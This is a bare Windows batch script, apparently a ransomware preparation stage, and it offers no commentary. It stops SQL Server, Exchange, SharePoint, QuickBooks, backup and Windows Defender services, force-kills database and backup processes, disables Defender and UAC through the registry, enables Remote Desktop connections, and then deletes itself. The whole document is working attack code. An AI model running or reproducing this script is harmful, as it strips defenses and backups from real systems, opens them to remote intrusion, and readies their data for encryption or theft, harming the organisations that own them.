@echo off

net stop MSSQLServerADHelper100
net stop MSSQL$ISARS
net stop MSSQL$MSFW
net stop SQLAgent$ISARS
net stop SQLAgent$MSFW
net stop SQLBrowser
net stop ReportServer$ISARS
net stop SQLWriter
net stop WinDefend
net stop mr2kserv
net stop MSExchangeADTopology
net stop MSExchangeFBA
net stop MSExchangeIS
net stop MSExchangeSA
net stop ShadowProtectSvc
net stop SPAdminV4
net stop SPTimerV4
net stop SPTraceV4
net stop SPUserCodeV4
net stop SPWriterV4
net stop SPSearch4
net stop MSSQLServerADHelper100
net stop IISADMIN
net stop firebirdguardiandefaultinstance
net stop ibmiasrw
net stop QBCFMonitorService
net stop QBVSS
net stop QBPOSDBServiceV12
net stop "IBM Domino Server (CProgramFilesIBMDominodata)"
net stop "IBM Domino Diagnostics (CProgramFilesIBMDomino)"
net stop IISADMIN
net stop "Simply Accounting Database Connection Manager"
net stop QuickBooksDB1
net stop QuickBooksDB2
net stop QuickBooksDB3
net stop QuickBooksDB4
net stop QuickBooksDB5
net stop QuickBooksDB6
net stop QuickBooksDB7
net stop QuickBooksDB8
net stop QuickBooksDB9
net stop QuickBooksDB10
net stop QuickBooksDB11
net stop QuickBooksDB12
net stop QuickBooksDB13
net stop QuickBooksDB14
net stop QuickBooksDB15
net stop QuickBooksDB16
net stop QuickBooksDB17
net stop QuickBooksDB18
net stop QuickBooksDB19
net stop QuickBooksDB20
net stop QuickBooksDB21
net stop QuickBooksDB22
net stop QuickBooksDB23
net stop QuickBooksDB24
net stop QuickBooksDB25
taskkill /f /im mysql*
taskkill /f /im IBM*
taskkill /f /im bes10*
taskkill /f /im black*
taskkill /f /im sql
taskkill /f /im store.exe
taskkill /f /im sql*
taskkill /f /im vee*
taskkill /f /im postg*
taskkill /f /im sage*
REG add "HKLM\SYSTEM\CurrentControlSet\services\WinDefend" /v Start /t REG_DWORD /d 4 /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 0 /f
del %0